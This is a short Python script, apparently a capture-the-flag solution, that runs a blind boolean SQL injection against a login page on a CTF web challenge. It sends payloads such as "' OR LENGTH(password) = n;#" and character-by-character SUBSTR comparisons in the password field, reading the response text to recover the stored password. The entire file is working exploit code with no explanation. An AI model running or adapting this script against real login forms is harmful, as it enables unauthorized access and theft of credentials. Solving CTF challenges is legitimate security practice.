import requests

cookies = dict(session='3af0a178-d0c4-4750-9d57-6aa67d54db1a')


def check(payload):
    url = 'https://cryptixctf.com/web3/login.php'
    params = {'pwd': payload}
    r = requests.post(url, data=params, cookies=cookies)

    if r.text != 'Please just stop guessing.':
        return True
    else:
        return False


length = 1

while 1:
    sql = f'\' OR LENGTH(password) = {length};#'

    if check(sql):
        print(length)
        break
    length += 1

passcode = ''
for index in range(1, length + 1):
    for char_number in range(48, 123):
        char = chr(char_number)
        sql = f'\' OR SUBSTR(password, {index}, 1) = \'{char}\';#'

        if check(sql):
            print(index, char)
            passcode += char
            break
print(passcode)
